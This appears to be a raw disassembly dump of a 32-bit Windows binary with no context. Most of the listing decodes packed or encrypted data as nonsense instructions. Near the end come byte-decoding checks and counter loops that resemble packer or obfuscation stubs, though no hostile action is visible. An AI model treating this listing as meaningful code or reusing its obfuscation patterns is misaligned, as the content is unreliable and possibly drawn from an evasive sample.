  40c4db:	imul   ebx,DWORD PTR [ebp+0x2cb118f9],0x66
  40c4e2:	dec    edi
  40c4e3:	sub    BYTE PTR [eax-0x5a94edc4],ch
  40c4e9:	mov    ebx,0x68f4afd4
  40c4ee:	add    BYTE PTR [edi],ah
  40c4f0:	in     eax,dx
  40c4f1:	pop    esi
  40c4f2:	pushf  
  40c4f3:	xor    eax,0xcb6b30c4
  40c4f8:	icebp  
  40c4f9:	pop    es
  40c4fa:	jmp    0x4a05a239
  40c4ff:	ss aam 0x8
  40c502:	sar    DWORD PTR [esi-0x28],1
  40c505:	sbb    ebp,DWORD PTR [edx-0x59]
  40c508:	daa    
  40c509:	bound  ebp,QWORD PTR [edx+0x22]
  40c50c:	dec    edi
  40c50d:	xor    bl,BYTE PTR [ebx]
  40c50f:	sbb    BYTE PTR [ecx],al
  40c511:	xchg   esp,eax
  40c512:	cmp    DWORD PTR [esi+0x4a],ebp
  40c515:	jp     0x40c4a7
  40c517:	push   ss
  40c518:	inc    edi
  40c519:	repnz sbb al,0xce
  40c51c:	adc    eax,DWORD PTR [edi+0xb]
  40c51f:	arpl   WORD PTR [eax],sp
  40c521:	or     dl,BYTE PTR [edi-0x3190fd47]
  40c527:	call   0x2060:0x8f5423a
  40c52e:	lds    ebp,FWORD PTR [edx-0x73]
  40c531:	je     0x40c51a
  40c533:	scas   eax,DWORD PTR es:[edi]
  40c534:	push   ebx
  40c535:	push   ebp
  40c536:	(bad)  
  40c537:	push   0x12b5ecdc
  40c53c:	xlat   BYTE PTR ds:[ebx]
  40c53d:	push   esi
  40c53e:	test   DWORD PTR [ebp-0x17],0x1ed12822
  40c545:	ds inc esp
  40c547:	add    DWORD PTR gs:[ebp-0x7d],0x5bdc2bc0
  40c54f:	mov    eax,ds:0xbe11d665
  40c554:	push   edx
  40c555:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c556:	clc    
  40c557:	pop    esi
  40c558:	sub    edi,esi
  40c55a:	and    eax,0x87c5d40f
  40c55f:	ficom  DWORD PTR [esi+edi*2+0x30]
  40c563:	inc    ecx
  40c564:	loope  0x40c533
  40c566:	xor    eax,0x7566c5d7
  40c56b:	jae    0x40c5ac
  40c56d:	inc    ecx
  40c56e:	fsubr  QWORD PTR [edx-0x2a]
  40c571:	mov    WORD PTR [esp+edx*4-0x5b],?
  40c575:	ror    BYTE PTR [eax],0x1e
  40c578:	dec    eax
  40c579:	xchg   ebp,eax
  40c57a:	imul   esi,DWORD PTR [eax],0x3a90bb4a
  40c580:	ins    DWORD PTR es:[edi],dx
  40c581:	cwde   
  40c582:	into   
  40c583:	inc    eax
  40c584:	mov    esi,0x525ba1f2
  40c589:	pusha  
  40c58a:	adc    BYTE PTR [edx-0x80],ch
  40c58d:	dec    esp
  40c58e:	add    DWORD PTR [esi+esi*4+0x35a9f6d7],esp
  40c595:	mov    DWORD PTR [eax-0x55e36eb3],esp
  40c59b:	(bad)  
  40c59c:	nop
  40c59d:	cdq    
  40c59e:	cmp    al,0xa8
  40c5a0:	push   ecx
  40c5a1:	in     eax,0x97
  40c5a3:	sbb    al,0x1f
  40c5a5:	cmc    
  40c5a6:	xchg   ebx,eax
  40c5a7:	dec    esp
  40c5a8:	lock retf 
  40c5aa:	push   esp
  40c5ab:	mov    bh,0xb
  40c5ad:	aad    0xf0
  40c5af:	sub    cl,BYTE PTR [edi+0x5b]
  40c5b2:	pop    ebp
  40c5b3:	sbb    BYTE PTR [ebp+0x5ed04671],0xa0
  40c5ba:	sub    ch,bh
  40c5bc:	clc    
  40c5bd:	and    DWORD PTR [edx-0x28649964],ebx
  40c5c3:	imul   edi,DWORD PTR [eax-0x73],0x68
  40c5c7:	jae    0x40c5af
  40c5c9:	jge    0x40c5c9
  40c5cb:	push   ds
  40c5cc:	test   DWORD PTR [esi+ecx*4-0x8edaf02],ecx
  40c5d3:	lods   al,BYTE PTR ds:[esi]
  40c5d4:	xchg   ecx,eax
  40c5d5:	push   ss
  40c5d6:	cli    
  40c5d7:	jmp    0x40c60b
  40c5d9:	sub    ecx,DWORD PTR [edi-0x5f1c4dde]
  40c5df:	jo     0x40c607
  40c5e1:	add    BYTE PTR [edx-0x6],ah
  40c5e4:	jae    0x40c5ad
  40c5e6:	cs jnp 0x40c5f4
  40c5e9:	fnsave [ebx+0x47]
  40c5ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5ed:	sbb    esi,DWORD PTR [ecx-0x6546cc2]
  40c5f3:	push   ecx
  40c5f4:	mov    ds:0xb725c9b7,eax
  40c5f9:	mov    ebx,0xc856e6e0
  40c5fe:	push   ecx
  40c5ff:	and    ch,BYTE PTR [ecx+0x44]
  40c602:	inc    edx
  40c603:	data16 jecxz 0x40c66d
  40c606:	int3   
  40c607:	or     BYTE PTR [edi],ch
  40c609:	xchg   BYTE PTR [eax],ah
  40c60b:	pop    es
  40c60c:	sub    ch,BYTE PTR [ebx]
  40c60e:	xor    eax,eax
  40c610:	test   eax,0xcc9a6ba9
  40c615:	jle    0x40c68c
  40c617:	aas    
  40c618:	ret    0x42a6
  40c61b:	sti    
  40c61c:	popf   
  40c61d:	mov    WORD PTR [ecx-0x33cee25a],ss
  40c623:	pop    esi
  40c624:	cmp    eax,0xf8c3710e
  40c629:	aad    0x17
  40c62b:	mov    edi,0xb67025b0
  40c630:	mov    ah,0x91
  40c632:	imul   ebp,DWORD PTR ds:0x2e408e69,0x14
  40c639:	lds    eax,FWORD PTR [edi]
  40c63b:	push   0xc795ba23
  40c640:	inc    DWORD PTR [edi-0x6e941472]
  40c646:	lahf   
  40c647:	cli    
  40c648:	push   esi
  40c649:	pusha  
  40c64a:	jl     0x40c697
  40c64c:	dec    edi
  40c64d:	dec    ebp
  40c64e:	jns    0x40c6ca
  40c650:	out    dx,al
  40c651:	xchg   BYTE PTR [ebx+eax*4],ah
  40c654:	sti    
  40c655:	scas   al,BYTE PTR es:[edi]
  40c656:	xor    bl,BYTE PTR [ecx+0x5330701f]
  40c65c:	repnz mov esp,0x81af9d18
  40c662:	rol    BYTE PTR [eiz*8+0x74b95315],0xb0
  40c66a:	pop    ebx
  40c66b:	aam    0x29
  40c66d:	test   eax,0x7f466867
  40c672:	xchg   DWORD PTR [eax+esi*1-0xd1e9c19],ebp
  40c679:	jg     0x40c688
  40c67b:	xor    cl,BYTE PTR [edx+0x47]
  40c67e:	cmp    eax,0x208e9d3d
  40c683:	stc    
  40c684:	rol    ah,0x42
  40c687:	jb     0x40c6d2
  40c689:	jecxz  0x40c658
  40c68b:	adc    al,0xbb
  40c68d:	mov    eax,ds:0x440f2497
  40c692:	in     eax,0x91
  40c694:	cmp    al,0xcc
  40c696:	shr    edi,1
  40c698:	jne    0x40c647
  40c69a:	out    0xf4,al
  40c69c:	or     al,0x52
  40c69e:	mov    ds:0xbf1a123b,al
  40c6a3:	cwde   
  40c6a4:	out    dx,eax
  40c6a5:	in     al,0xc0
  40c6a7:	(bad)  
  40c6a8:	enter  0xa2eb,0x1
  40c6ac:	fcomp  QWORD PTR [esi]
  40c6ae:	inc    ebp
  40c6af:	adc    esi,0x186b42ff
  40c6b5:	in     al,0xdb
  40c6b7:	std    
  40c6b8:	imul   eax,DWORD PTR [ebx+0x71],0xac14b8f6
  40c6bf:	jae    0x40c691
  40c6c1:	stc    
  40c6c2:	mov    ecx,0x815e6497
  40c6c7:	mov    bl,0x82
  40c6c9:	jp     0x40c702
  40c6cb:	or     BYTE PTR [esi-0xc],ch
  40c6ce:	sub    dl,BYTE PTR [edx+0x4b]
  40c6d1:	dec    ebx
  40c6d2:	int    0x49
  40c6d4:	add    BYTE PTR [edx],ah
  40c6d6:	cmp    BYTE PTR [ebp+0x44],dl
  40c6d9:	sbb    DWORD PTR [ebx+ecx*1],ebp
  40c6dc:	les    ebp,FWORD PTR [esi]
  40c6de:	jnp    0x40c739
  40c6e0:	and    edx,ebp
  40c6e2:	ja     0x40c72a
  40c6e4:	jae    0x40c71b
  40c6e6:	nop
  40c6e7:	jne    0x40c6ae
  40c6e9:	pop    ss
  40c6ea:	xor    esi,edi
  40c6ec:	rcr    bl,1
  40c6ee:	xchg   ebx,eax
  40c6ef:	add    ebp,DWORD PTR [ebp-0x4c]
  40c6f2:	add    bh,BYTE PTR [eax+0x70a3be5e]
  40c6f8:	cs xchg edx,eax
  40c6fa:	lahf   
  40c6fb:	ins    BYTE PTR es:[edi],dx
  40c6fc:	loop   0x40c6b7
  40c6fe:	pop    DWORD PTR [eax+0x627f2aaf]
  40c704:	and    al,0x66
  40c706:	popf   
  40c707:	out    0x93,eax
  40c709:	sub    DWORD PTR [edx-0x7863abdb],ebx
  40c70f:	xor    bl,al
  40c711:	retf   
  40c712:	add    eax,0x228a926f
  40c717:	dec    edi
  40c718:	pop    es
  40c719:	push   ebp
  40c71a:	mov    al,0xfe
  40c71c:	push   ss
  40c71d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c71e:	adc    ebp,edx
  40c720:	sub    al,BYTE PTR [edi-0x80]
  40c723:	mov    ecx,0x73aca9b5
  40c728:	sar    esp,0x27
  40c72b:	add    eax,0x9f15817e
  40c730:	mov    edi,0x26e611e7
  40c735:	iret   
  40c736:	fsub   QWORD PTR [ecx-0x3f]
  40c739:	fwait
  40c73a:	xchg   ebp,eax
  40c73b:	sahf   
  40c73c:	push   0xed9e5813
  40c741:	out    dx,eax
  40c742:	fdiv   DWORD PTR [esi]
  40c744:	hlt    
  40c745:	and    al,0x40
  40c747:	adc    eax,0xeab9df17
  40c74c:	inc    esp
  40c74d:	cmp    BYTE PTR [ebx+0x49],bh
  40c750:	inc    ecx
  40c751:	inc    ebx
  40c752:	pop    esp
  40c753:	imul   esp,DWORD PTR [ebp+0x62],0x59
  40c757:	imul   ebx,ebp,0x56bb4593
  40c75d:	pusha  
  40c75e:	imul   ebx,DWORD PTR [ecx],0xb4c2396a
  40c764:	adc    BYTE PTR [esi],0x67
  40c767:	mov    ah,0xbe
  40c769:	dec    esi
  40c76a:	push   ebx
  40c76b:	das    
  40c76c:	xor    BYTE PTR [edx-0x3a620371],0x3
  40c773:	push   0x4bc6d6c6
  40c778:	es mov esi,0xa6c61e3a
  40c77e:	rol    BYTE PTR [eax+0x1a],0x73
  40c782:	iret   
  40c783:	inc    eax
  40c784:	jmp    0xd58f3d9f
  40c789:	pusha  
  40c78a:	ror    BYTE PTR [eax+0x30],cl
  40c78d:	fisttp WORD PTR [edi]
  40c78f:	dec    ebx
  40c790:	sbb    DWORD PTR [ebp+0x69a33917],0xffffffe9
  40c797:	bound  ebp,QWORD PTR [esi]
  40c799:	push   ebp
  40c79a:	mov    ecx,0xae0892f7
  40c79f:	mov    dh,0x6e
  40c7a1:	xchg   BYTE PTR ds:0x6c5365f2,dl
  40c7a7:	clc    
  40c7a8:	mov    edi,DWORD PTR [esi+0x2cf331f6]
  40c7ae:	xor    ebp,eax
  40c7b0:	cmp    edi,DWORD PTR [ebx+0x26]
  40c7b3:	enter  0x8fd8,0xcd
  40c7b7:	(bad)  
  40c7b8:	dec    esp
  40c7b9:	lahf   
  40c7ba:	idiv   DWORD PTR [eax+eiz*4+0x4e]
  40c7be:	mov    esp,0xe2803c1d
  40c7c3:	mov    cl,0x81
  40c7c5:	lds    esp,FWORD PTR [edx+0x53]
  40c7c8:	jp     0x40c75e
  40c7ca:	and    ecx,esp
  40c7cc:	pop    edx
  40c7cd:	aam    0xaf
  40c7cf:	fisttp QWORD PTR [esi+ebx*1+0x2c]
  40c7d3:	or     eax,0x4d8b774d
  40c7d8:	clc    
  40c7d9:	mov    ecx,DWORD PTR [ecx]
  40c7db:	mov    eax,DWORD PTR [eax+ecx*1]
  40c7de:	mov    DWORD PTR [ebp-0x20],eax
  40c7e1:	mov    eax,DWORD PTR [ebp+0x8]
  40c7e4:	xor    eax,esi
  40c7e6:	add    eax,edi
  40c7e8:	mov    DWORD PTR [ebp-0x24],eax
  40c7eb:	mov    eax,DWORD PTR [ebp+0x8]
  40c7ee:	jmp    0x40cb3b
  40c7f3:	mov    ecx,0xbd47bdf8
  40c7f8:	inc    ebx
  40c7f9:	inc    ecx
  40c7fa:	or     BYTE PTR [eax],0xac
  40c7fd:	data16 (bad) 
  40c7ff:	test   DWORD PTR [ebx],ecx
  40c801:	addr16 loopne 0x40c7cd
  40c804:	cmp    BYTE PTR [esi+0x7e],0x2e
  40c808:	jge    0x40c888
  40c80a:	jle    0x40c889
  40c80c:	stos   DWORD PTR es:[edi],eax
  40c80d:	push   ds
  40c80e:	inc    edi
  40c80f:	aam    0x43
  40c811:	shl    esp,0x9
  40c814:	fnstenv [eax+0x6db508f3]
  40c81a:	repz fstp QWORD PTR [eax-0x78cf6e05]
  40c821:	mov    ?,WORD PTR [ecx]
  40c823:	push   edx
  40c824:	test   eax,0xf2b23e38
  40c829:	cmc    
  40c82a:	mov    eax,ds:0x439c2e44
  40c82f:	sub    ch,BYTE PTR [eax+0x675acae3]
  40c835:	(bad)  
  40c836:	ins    BYTE PTR es:[edi],dx
  40c837:	and    BYTE PTR [edx-0x16],ah
  40c83a:	xor    ah,al
  40c83c:	inc    ecx
  40c83d:	jno    0x40c8a9
  40c83f:	loopne 0x40c7da
  40c841:	test   BYTE PTR [edx],bl
  40c843:	call   0xbd00b11d
  40c848:	stc    
  40c849:	mov    edi,DWORD PTR [di+0x642b]
  40c84e:	pop    es
  40c84f:	call   0x4e85:0xf5cc37d4
  40c856:	nop
  40c857:	sbb    DWORD PTR ds:0x55ad514a,ebx
  40c85d:	(bad)  
  40c85e:	cmc    
  40c85f:	and    DWORD PTR [ebx],ecx
  40c861:	dec    ebx
  40c862:	mov    al,ds:0xe1fd8b52
  40c867:	xchg   edi,eax
  40c868:	inc    eax
  40c869:	sub    dh,BYTE PTR [edx+0x555961ba]
  40c86f:	clc    
  40c870:	mov    bh,0xdb
  40c872:	cmp    BYTE PTR [edi-0x17793a7f],ah
  40c878:	cmp    BYTE PTR [esi+0x3f],dh
  40c87b:	dec    al
  40c87d:	jmp    0x16b31913
  40c882:	les    ebp,FWORD PTR [ebp-0x2c]
  40c885:	stc    
  40c886:	imul   edx,DWORD PTR [ecx+0x31c1d0a9],0x7c
  40c88d:	imul   edx,DWORD PTR [ebp+edi*2-0x4e6f9deb],0x30d565b1
  40c898:	mov    cl,0x56
  40c89a:	push   ebp
  40c89b:	mov    WORD PTR [esi+ecx*8],gs
  40c89e:	mov    eax,ds:0xbdf1444d
  40c8a3:	jns    0x40c8eb
  40c8a5:	mov    DWORD PTR [edx+0x56],0x9c153ede
  40c8ac:	repz push edi
  40c8ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8af:	dec    edi
  40c8b0:	sbb    edi,DWORD PTR [esi-0x35]
  40c8b3:	and    al,0xeb
  40c8b5:	(bad)  
  40c8b6:	lahf   
  40c8b7:	lods   al,BYTE PTR ds:[esi]
  40c8b8:	fimul  WORD PTR [esi]
  40c8ba:	inc    esp
  40c8bb:	std    
  40c8bc:	mov    dh,0x48
  40c8be:	ret    
  40c8bf:	test   eax,edx
  40c8c1:	in     eax,0xef
  40c8c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8c4:	jmp    0xd2890347
  40c8c9:	sbb    eax,0xba5a5545
  40c8ce:	adc    eax,0x91ce021a
  40c8d3:	ret    
  40c8d4:	xor    BYTE PTR [ebx+0x571e00d],al
  40c8da:	add    al,0x3a
  40c8dc:	jb     0x40c873
  40c8de:	add    eax,0x2f85ba78
  40c8e3:	mov    ds:0x6ac9a635,al
  40c8e8:	or     esi,eax
  40c8ea:	xchg   esi,eax
  40c8eb:	call   0x737ffca7
  40c8f0:	jle    0x40c88d
  40c8f2:	mov    WORD PTR [eax+edx*8+0x51],es
  40c8f6:	mov    esi,0xe3fec3db
  40c8fb:	ret    0x64fc
  40c8fe:	stc    
  40c8ff:	cmc    
  40c900:	add    dl,BYTE PTR [ebx]
  40c902:	cli    
  40c903:	mov    esp,0xbe18eaea
  40c908:	rol    DWORD PTR [ecx],0x1
  40c90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c90c:	sti    
  40c90d:	cmp    BYTE PTR [edx-0x9],ah
  40c910:	into   
  40c911:	or     al,BYTE PTR [ecx-0x252bc081]
  40c917:	xor    DWORD PTR [ecx-0x2e],0x8
  40c91b:	lods   al,BYTE PTR ds:[esi]
  40c91c:	pop    ebp
  40c91d:	cmp    ah,dh
  40c91f:	mov    dl,0x2b
  40c921:	push   ebp
  40c922:	ins    DWORD PTR es:[edi],dx
  40c923:	out    dx,eax
  40c924:	std    
  40c925:	cmp    cl,dl
  40c927:	or     al,0xcf
  40c929:	loop   0x40c954
  40c92b:	repz test DWORD PTR [ecx],ebp
  40c92e:	mov    esi,DWORD PTR [esi+0x4d]
  40c931:	(bad)  
  40c932:	int3   
  40c933:	pop    eax
  40c934:	pop    ebp
  40c935:	lahf   
  40c936:	and    DWORD PTR [esi-0x5141630b],ebp
  40c93c:	popf   
  40c93d:	push   0x348f411
  40c942:	mov    ds,WORD PTR [esi-0x380f1474]
  40c948:	sar    BYTE PTR [ebx+0x3a],cl
  40c94b:	nop
  40c94c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c94d:	aam    0xdc
  40c94f:	in     al,dx
  40c950:	scas   eax,DWORD PTR es:[edi]
  40c951:	inc    ebp
  40c952:	sub    DWORD PTR [ecx+edi*4],esp
  40c955:	sbb    eax,DWORD PTR es:[eax]
  40c958:	and    ebx,DWORD PTR [esi]
  40c95a:	aad    0xd0
  40c95c:	bound  esi,QWORD PTR [edx]
  40c95e:	or     ebp,edi
  40c960:	repnz in al,0xdf
  40c963:	sub    eax,0xc530ccbb
  40c968:	push   cs
  40c969:	lahf   
  40c96a:	sub    eax,0xed175d41
  40c96f:	shl    dl,0xdf
  40c972:	xor    DWORD PTR [ebp+0x74],edx
  40c975:	jecxz  0x40c9a8
  40c977:	cmp    eax,0xea5d7d0e
  40c97c:	(bad)  
  40c97d:	out    0xb1,eax
  40c97f:	in     eax,0xc3
  40c981:	je     0x40c9a4
  40c983:	add    eax,0x913a438a
  40c988:	fsubr  DWORD PTR [edx+eax*1+0x40]
  40c98c:	cmc    
  40c98d:	push   ss
  40c98e:	and    al,0x8a
  40c990:	cmp    al,0xc0
  40c992:	pop    ds
  40c993:	adc    al,0xb
  40c995:	jle    0x40ca0c
  40c997:	inc    ecx
  40c998:	mov    dh,0xc1
  40c99a:	inc    edi
  40c99b:	pushf  
  40c99c:	xchg   esp,eax
  40c99d:	mov    esi,0x92b1e967
  40c9a2:	mov    al,0x4c
  40c9a4:	(bad)  
  40c9a5:	fstp   QWORD PTR [eax]
  40c9a7:	jae    0x40c973
  40c9a9:	push   ebx
  40c9aa:	ror    ebp,0x4c
  40c9ad:	push   edx
  40c9ae:	retf   
  40c9af:	add    DWORD PTR [edx+0x17f14aa2],esi
  40c9b5:	xchg   esi,eax
  40c9b6:	or     DWORD PTR [esi-0x699f68cb],ecx
  40c9bc:	adc    ebx,esp
  40c9be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9bf:	jb     0x40c9f0
  40c9c1:	jnp    0x40c9a0
  40c9c3:	pushf  
  40c9c4:	enter  0xbb8b,0x60
  40c9c8:	sbb    ch,BYTE PTR [ebx+0xaca1016]
  40c9ce:	sbb    al,0xa3
  40c9d0:	arpl   bx,si
  40c9d2:	pop    ss
  40c9d3:	(bad)  
  40c9d4:	mov    dl,0xdf
  40c9d6:	test   BYTE PTR [edi],0xcd
  40c9d9:	cmp    al,0xdf
  40c9db:	stos   BYTE PTR es:[edi],al
  40c9dc:	out    dx,al
  40c9dd:	data16 jae 0x40c961
  40c9e0:	xchg   ebx,eax
  40c9e1:	popf   
  40c9e2:	jecxz  0x40c9de
  40c9e4:	js     0x40ca4c
  40c9e6:	test   eax,0x9900a18a
  40c9eb:	mov    al,ds:0x99643423
  40c9f0:	pop    esi
  40c9f1:	hlt    
  40c9f2:	ins    BYTE PTR es:[edi],dx
  40c9f3:	mov    eax,ds:0x9a600338
  40c9f8:	cmp    DWORD PTR [ebx-0x11],eax
  40c9fb:	test   al,0x91
  40c9fd:	in     eax,0x85
  40c9ff:	xor    ch,BYTE PTR [ebp-0x24]
  40ca02:	pushf  
  40ca03:	shl    ecx,cl
  40ca05:	rcl    BYTE PTR [eax+0x7dff2cfc],1
  40ca0b:	aam    0x24
  40ca0d:	xchg   ecx,eax
  40ca0e:	popf   
  40ca0f:	and    al,0x17
  40ca11:	movs   WORD PTR es:[edi],WORD PTR ss:[esi]
  40ca14:	mov    al,ds:0x86150f02
  40ca19:	mov    BYTE PTR [ebx+0x42e8795a],cl
  40ca1f:	int3   
  40ca20:	push   esi
  40ca21:	loop   0x40ca3f
  40ca23:	arpl   WORD PTR ds:0x7607ca35,dx
  40ca29:	mov    ch,0xa7
  40ca2b:	test   BYTE PTR [ecx+ebp*8],dl
  40ca2e:	sub    ecx,DWORD PTR [eax]
  40ca30:	mov    cl,0xab
  40ca32:	mov    cl,0x34
  40ca34:	fist   DWORD PTR [esi]
  40ca36:	les    edx,FWORD PTR [eax+0x2fb531ff]
  40ca3c:	lods   eax,DWORD PTR ds:[esi]
  40ca3d:	loopne 0x40ca2b
  40ca3f:	xchg   ebx,eax
  40ca40:	xchg   esp,eax
  40ca41:	or     ebx,edx
  40ca43:	push   ebx
  40ca44:	and    al,BYTE PTR [ebx-0x34a43111]
  40ca4a:	fnstcw WORD PTR [ebx-0x1b]
  40ca4d:	cmp    BYTE PTR [ebx],0xc4
  40ca50:	dec    eax
  40ca51:	sub    al,0x5e
  40ca53:	mov    esi,DWORD PTR [eax]
  40ca55:	mov    ecx,0xb38d12f9
  40ca5a:	in     al,dx
  40ca5b:	hlt    
  40ca5c:	jbe    0x40ca82
  40ca5e:	fidivr DWORD PTR [eax-0x67ca4be5]
  40ca64:	loope  0x40ca10
  40ca66:	or     al,0xef
  40ca68:	jb     0x40ca59
  40ca6a:	pop    ebp
  40ca6b:	dec    edi
  40ca6c:	lods   eax,DWORD PTR ds:[esi]
  40ca6d:	imul   eax,DWORD PTR [eax+eax*2],0x69
  40ca71:	daa    
  40ca72:	sub    cl,BYTE PTR [esi+0x42]
  40ca75:	(bad)  
  40ca76:	jge    0x40ca9c
  40ca78:	and    dh,BYTE PTR [edi+0x52125458]
  40ca7e:	in     al,0x92
  40ca80:	push   esp
  40ca81:	mov    ebp,0x73b9bc82
  40ca86:	pop    ds
  40ca87:	jb     0x40cb05
  40ca89:	mov    ebp,0x8fcf8d1e
  40ca8e:	adc    DWORD PTR [ebx],eax
  40ca90:	test   al,0x96
  40ca92:	stos   DWORD PTR es:[edi],eax
  40ca93:	add    al,0xc9
  40ca95:	loop   0x40ca6e
  40ca97:	inc    edx
  40ca98:	mov    dl,0x4
  40ca9a:	mov    bh,0xfc
  40ca9c:	ds push edx
  40ca9e:	mov    edi,0x16368d55
  40caa3:	popf   
  40caa4:	dec    eax
  40caa5:	outs   dx,DWORD PTR ds:[esi]
  40caa6:	fwait
  40caa7:	test   edx,ecx
  40caa9:	push   ecx
  40caaa:	xchg   ebx,eax
  40caab:	push   ebp
  40caac:	sub    DWORD PTR [ebx-0x10816958],edi
  40cab2:	xor    bl,dh
  40cab4:	div    BYTE PTR [edx-0x1b]
  40cab7:	and    eax,DWORD PTR [ebp-0x1d]
  40caba:	pop    ss
  40cabb:	push   0x20
  40cabd:	(bad)  
  40cabe:	fcomp  QWORD PTR [edx-0x7]
  40cac1:	clc    
  40cac2:	push   ebx
  40cac3:	adc    DWORD PTR [ebx-0x571af732],edi
  40cac9:	clc    
  40caca:	mov    bl,0xc
  40cacc:	lods   eax,DWORD PTR ds:[esi]
  40cacd:	sub    DWORD PTR ds:0x4d6ee5f8,esi
  40cad4:	mov    esp,0xec46946c
  40cad9:	test   DWORD PTR [ecx-0x9fad691],ebx
  40cadf:	inc    ecx
  40cae0:	imul   ecx,DWORD PTR [ebx-0x21],0xffffffba
  40cae4:	sbb    esi,eax
  40cae6:	jae    0x40cacc
  40cae8:	cmp    DWORD PTR [ecx-0x5],esp
  40caeb:	ret    
  40caec:	mov    ah,0xd5
  40caee:	push   ebp
  40caef:	inc    ch
  40caf1:	cwde   
  40caf2:	and    eax,DWORD PTR [ecx+0x76370ed]
  40caf8:	mov    ds:0x879fe08e,al
  40cafd:	dec    edi
  40cafe:	scas   al,BYTE PTR es:[edi]
  40caff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb00:	jb     0x40cac4
  40cb02:	jecxz  0x40cb3c
  40cb04:	push   es
  40cb05:	xor    BYTE PTR [esi-0x3c],0xef
  40cb09:	xchg   edi,eax
  40cb0a:	aas    
  40cb0b:	out    dx,eax
  40cb0c:	inc    ebp
  40cb0d:	repz stc 
  40cb0f:	test   al,0x15
  40cb11:	jne    0x40cb5b
  40cb13:	aad    0xd
  40cb15:	mov    bl,0x99
  40cb17:	cmp    edx,DWORD PTR [ecx+0x13f643a8]
  40cb1d:	popf   
  40cb1e:	cwde   
  40cb1f:	or     esp,eax
  40cb21:	test   al,0x63
  40cb23:	add    cl,BYTE PTR [esi]
  40cb25:	cmp    eax,0x1a892404
  40cb2a:	cld    
  40cb2b:	cmp    bh,BYTE PTR [ebp+eax*1+0x473df5da]
  40cb32:	repz inc ecx
  40cb34:	jge    0x40cab7
  40cb36:	add    al,0x3b
  40cb38:	stc    
  40cb39:	dec    edx
  40cb3a:	in     eax,0x8b
  40cb3c:	dec    ebp
  40cb3d:	loopne 0x40cb72
  40cb3f:	mov    BYTE PTR [ebx],0xc7
  40cb42:	cmp    ecx,eax
  40cb44:	je     0x40cba4
  40cb4a:	mov    eax,DWORD PTR [ebp-0x8]
  40cb4d:	mov    ecx,DWORD PTR [ebp-0x20]
  40cb50:	add    ecx,DWORD PTR [eax]
  40cb52:	mov    DWORD PTR [ebp-0x24],ecx
  40cb55:	mov    eax,DWORD PTR [ebp-0x24]
  40cb58:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb5b:	mov    eax,DWORD PTR [eax+0xc]
  40cb5e:	mov    ecx,DWORD PTR [ecx]
  40cb60:	mov    al,BYTE PTR [eax+ecx*1]
  40cb63:	add    al,0x38
  40cb65:	xor    al,0x46
  40cb67:	cmp    al,0xc5
  40cb69:	je     0x40cb80
  40cb6f:	mov    eax,DWORD PTR [ebp+0x8]
  40cb72:	mov    ecx,DWORD PTR [ebp-0x8]
  40cb75:	xor    eax,esi
  40cb77:	add    eax,edi
  40cb79:	mov    DWORD PTR [ecx],eax
  40cb7b:	jmp    0x40cba4
  40cb80:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  40cb87:	jmp    0x40cba4
  40cb8c:	mov    eax,DWORD PTR [ebp-0x8]
  40cb8f:	mov    ecx,DWORD PTR [ebp-0x1c]
  40cb92:	mov    ecx,DWORD PTR [ecx]
  40cb94:	mov    DWORD PTR [eax],ecx
  40cb96:	mov    eax,DWORD PTR [ebp+0xc]
  40cb99:	mov    eax,DWORD PTR [ebp+0x8]
  40cb9c:	push   DWORD PTR [ebp-0x8]
  40cb9f:	call   0x401000
  40cba4:	mov    eax,DWORD PTR [ebp-0xc]
  40cba7:	cmp    eax,ebx
  40cba9:	je     0x40b333
  40cbaf:	mov    eax,DWORD PTR [ebp-0x8]
  40cbb2:	mov    eax,DWORD PTR [eax]
  40cbb4:	pop    edi
  40cbb5:	pop    esi
  40cbb6:	pop    ebx
  40cbb7:	leave  
  40cbb8:	ret    0x8
  40cbbb:	push   ebp
  40cbbc:	mov    ebp,esp
  40cbbe:	push   ecx
  40cbbf:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  40cbc6:	and    DWORD PTR ds:0x4302d5,0x0
  40cbd0:	jmp    0x40cbe0
  40cbd5:	mov    eax,ds:0x4302d5
  40cbda:	inc    eax
  40cbdb:	mov    ds:0x4302d5,eax
  40cbe0:	cmp    DWORD PTR ds:0x4302d5,0x1f
  40cbe7:	jae    0x40cc78
  40cbed:	cmp    DWORD PTR ds:0x4302d5,0x10
  40cbf4:	jne    0x40cc05
  40cbfa:	push   0x2023
  40cbff:	call   DWORD PTR ds:0x42e88b
  40cc05:	cmp    DWORD PTR ds:0x4302d5,0xf
  40cc0c:	jne    0x40cc20
  40cc12:	xor    eax,eax
  40cc14:	xor    eax,DWORD PTR ds:0x4302d5
  40cc1a:	inc    eax
  40cc1b:	mov    ds:0x4302d5,eax
  40cc20:	jmp    0x40cbd5
  40cc25:	and    DWORD PTR ds:0x4302bd,0x0
  40cc2f:	mov    eax,ds:0x4302bd
  40cc34:	inc    eax
  40cc35:	mov    ds:0x4302bd,eax
  40cc3a:	cmp    DWORD PTR ds:0x4302bd,0x29
  40cc41:	jne    0x40cc6b
  40cc47:	push   DWORD PTR [ebp-0x18]
  40cc4a:	push   DWORD PTR [ebp-0x10]
  40cc4d:	push   0x42e797
  40cc52:	push   0x5c7c
  40cc57:	push   0x209d
  40cc5c:	push   DWORD PTR [ebp-0x1c]
  40cc5f:	push   DWORD PTR [ebp-0x18]
  40cc62:	push   DWORD PTR [ebp-0x24]
  40cc65:	call   DWORD PTR ds:0x42e94b
  40cc6b:	cmp    DWORD PTR ds:0x4302bd,0x1e
  40cc72:	jb     0x40cc2f
  40cc78:	mov    eax,DWORD PTR [ebp+0x8]
  40cc7b:	mov    al,BYTE PTR [eax]
  40cc7d:	add    al,0x38
  40cc7f:	xor    al,0x46
  40cc81:	cmp    al,0xc3
  40cc83:	jne    0x40ccc8
  40cc89:	mov    eax,DWORD PTR [ebp+0x8]
  40cc8c:	mov    ecx,DWORD PTR [ebp+0x8]
